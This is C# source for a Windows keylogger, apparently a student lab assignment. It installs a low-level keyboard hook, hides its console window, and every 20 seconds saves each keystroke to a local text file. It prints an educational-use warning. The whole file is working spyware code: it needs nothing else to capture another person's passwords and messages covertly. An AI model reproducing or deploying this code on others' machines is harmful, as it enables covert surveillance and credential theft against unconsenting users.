using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
//using System.IO;
using System.Windows.Forms;

namespace Lab5
{
    class Program
    {

        private const int WH_KEYBOARD_LL = 13; //Number of low-level hook for keyboards
        private const int WM_KEYDOWN = 0x0100; //Keyboard input signal sent when a key is pressed.
        const int SW_HIDE = 0; //The ShowWindow code for hiding the window.
        const int SW_SHOW = 5; //The ShowWindow code for displaying the window.
        private static LowLevelKeyboardProc _proc = HookCallback; //The delegate that handles setting the hook and getting response from it. 
        private static IntPtr _hookID = IntPtr.Zero; //the ID for the hook. since it's the only one, it's zero.

        private static List<string> keys = new List<string>();
        private static string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + @"\output.txt";

        private static void ProcessTimer(object sender, EventArgs e)
        {

            string output = string.Join("\n", keys);
            if (output.Length != 0)
                output += "\n";

            System.IO.File.WriteAllText(path, output);
        }

        static void Main(string[] args)
        {
            Console.WriteLine(String.Format("ALERT:\n" +
                "This key logging program is to be used for educational/research purposes only.\n" +
                "Rogue manipulation of data is a serious crime " +
                "(art. 349-355 of Belarus criminal code).\n"));
            Console.WriteLine($"Writing to {path}\n");
            Console.WriteLine($"Press RETURN to begin\n");
            Console.Read();

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            Timer timer = new Timer();
            timer.Tick += new EventHandler(ProcessTimer);
            timer.Interval = 20000;
            timer.Start();

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                keys.Add(((Keys)vkCode).ToString());
                if (keys.Last() == "F12")
                {
                    var handle = GetConsoleWindow();
                    ShowWindow(handle, SW_SHOW);
                }
                //Console.WriteLine((Keys)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        #region - Dll import

        [DllImport("msvcrt")]
        static extern int _getch();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        #endregion

    }

}